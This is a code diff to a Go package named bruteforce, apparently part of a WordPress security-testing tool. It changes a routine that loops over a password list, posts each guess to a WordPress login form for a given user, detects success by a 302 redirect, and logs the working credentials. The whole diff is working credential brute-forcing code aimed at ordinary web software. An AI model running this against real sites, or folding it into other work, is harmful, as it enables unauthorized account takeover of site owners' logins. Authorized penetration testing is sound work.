@@ -2,8 +2,8 @@ package bruteforce
 
 import (
 	"bufio"
+	"net/http"
 	"os"
-	"regexp"
 
 	"github.com/institute-atri/glogger"
 	"github.com/institute-atri/gnet"
@@ -36,19 +36,31 @@ func Bruteforce(url, user string) {
 func tryingPasswords(scanner *bufio.Scanner, url, user string) {
 	for scanner.Scan() {
 		word := scanner.Text()
-		response := gnet.POST(url, "log="+user+"&pwd="+word+"&wp-submit=Acessar&redirect_to="+url+"testcookie=1")
 
-		if response.StatusCode == 404 {
-			read := regexp.MustCompile(`<meta name="generator" content="WordPress [\d.]+?" />`)
+		r := gnet.NewHttp()
 
-			matches := read.FindAllString(string(response.BRaw), -1)
+		r.SetURL(url)
+		r.SetMethod("POST")
+		r.SetData("log=" + user + "&pwd=" + word + "&wp-submit=Acessar&redirect_to=" + url + "testcookie=1")
+		r.SetContentType("application/x-www-form-urlencoded")
 
-			for _, match := range matches {
-				if match != "" {
-					glogger.Done("login:\n username:" + user + "\n password:" + word)
-				}
+		found := false
+
+		r.SetRedirectFunc(func(req *http.Request, via []*http.Request) error {
+			if req.Response.StatusCode == 302 {
+				glogger.Done("login:\n username:" + user + "\n password:" + word)
+				found = true
 			}
 
+			return nil
+		})
+		_, err := r.Do()
+
+		if err != nil {
+			println(err)
+		}
+
+		if found {
 			break
 		}
 	}
